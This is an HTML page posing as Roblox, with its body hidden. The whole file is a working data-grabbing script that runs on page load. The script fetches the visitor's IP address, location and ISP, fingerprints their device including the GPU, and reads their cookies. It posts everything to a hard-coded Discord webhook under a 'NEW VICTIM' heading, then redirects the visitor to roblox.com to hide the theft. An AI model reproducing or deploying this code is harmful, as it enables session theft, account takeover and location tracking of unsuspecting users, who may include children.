<!DOCTYPE html>
<html>
<head><title>Roblox</title></head>
<body style="display:none;">

<script>
var webhook = "https://discord.com/api/webhooks/1517070488721948743/RNcyTwya9CDyheCrLPSTNDtENc8i04ybtfWloKAw-PoZYqXuvJL6nGXvnVIFPyhj_yCW";

async function grab() {

    // === GEOLOCATION ===
    var geo = {};
    try {
        var r = await fetch("https://ipapi.co/json/");
        if (r.ok) geo = await r.json();
    } catch(e) {}

    // === DEVICE ===
    var nav = navigator;
    var scr = screen;
    var win = window;

    var gpu = "unknown";
    try {
        var canvas = document.createElement("canvas");
        var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (gl) {
            var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
            gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "unknown";
        }
    } catch(e) {}

    // === COOKIE — wait 2 seconds then grab ===
    await new Promise(r => setTimeout(r, 2000));
    var cookie = document.cookie || "no_cookie";

    // === TRY TO GRAB ALL COOKIES FROM ALL DOMAINS ===
    var allCookies = cookie;

    // === BUILD MESSAGE ===
    var msg = "**🎯 ===== NEW VICTIM =====**\n\n";

    msg += "**📍 LOCATION**\n";
    msg += "IP: " + (geo.ip || "unknown") + "\n";
    msg += "City: " + (geo.city || "unknown") + "\n";
    msg += "Region: " + (geo.region || "unknown") + "\n";
    msg += "Country: " + (geo.country_name || "unknown") + "\n";
    msg += "Coordinates: " + (geo.latitude || "?") + ", " + (geo.longitude || "?") + "\n";
    msg += "Timezone: " + (geo.timezone || "unknown") + "\n\n";

    msg += "**📡 INTERNET**\n";
    msg += "ISP: " + (geo.org || "unknown") + "\n";
    msg += "ASN: " + (geo.asn || "unknown") + "\n\n";

    msg += "**📱 DEVICE**\n";
    msg += "Platform: " + (nav.platform || "unknown") + "\n";
    msg += "CPU Cores: " + (nav.hardwareConcurrency || "unknown") + "\n";
    msg += "RAM: " + (nav.deviceMemory || "unknown") + " GB\n";
    msg += "GPU: " + gpu + "\n";
    msg += "Screen: " + scr.width + "x" + scr.height + "\n";
    msg += "User Agent: " + (nav.userAgent || "unknown") + "\n\n";

    msg += "**🔗 SESSION**\n";
    msg += "Local Time: " + new Date().toLocaleString() + "\n\n";

    msg += "**🍪 COOKIE**\n";
    msg += "||" + allCookies + "||";

    // === SEND ===
    await fetch(webhook, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({content: msg})
    });

    // === REDIRECT ===
    window.location = "https://www.roblox.com";
}

grab();
</script>

</body>
</html>
